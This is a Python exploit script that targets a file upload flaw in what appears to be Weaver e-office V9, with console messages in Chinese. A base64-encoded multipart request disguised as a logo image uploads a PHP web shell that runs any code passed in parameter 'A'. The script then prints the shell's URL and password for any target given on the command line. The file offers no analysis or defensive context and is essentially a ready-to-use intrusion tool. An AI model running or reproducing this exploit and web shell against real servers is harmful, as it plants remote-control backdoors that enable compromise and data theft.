import requests
import sys
import console
import random
from queue import Queue
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time
BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[1;33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'
def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC
def info():
    return VIOLET + "[INFO] " + ENDC
def error():
    return RED + "[ERROR] " + ENDC
def warning():
    return YELLOW + "[WARNING] " + ENDC
def success():
    return GREEN + "[SUCCESS] " + ENDC
def POC(target_url):
    vuln_url = target_url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryVB9nc4BgAcsa6lq4",
        "Cookie": "PHPSESSID=j0j0"
    }
    data = base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5VkI5bmM0QmdBY3NhNmxxNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkZpbGVkYXRhIjsgZmlsZW5hbWU9ImowajAucGhwIgpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcKCjw/cGhwIEBldmFsKCRfUkVRVUVTVFtBXSk7Pz4KCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeVZCOW5jNEJnQWNzYTZscTQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5)
        if response.status_code == 200 and 'logo-eoffice.php' in response.text:
            print(now_time() + success() + "木马地址:{}/images/logo/logo-eoffice.php 密码A".format(target_url))
            return 'ok'
        else:
            print(now_time() + warning() + '不存在V9文件上传漏洞')
    except Exception as e:
        print(now_time() + error() + e)
def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        if url[-1] != '/':
            url += '/'
        POC(url)
    else:
        print("python3 {} http://xx.xx.xx.xx".format(sys.argv[0]))


if __name__ == '__main__':
    main()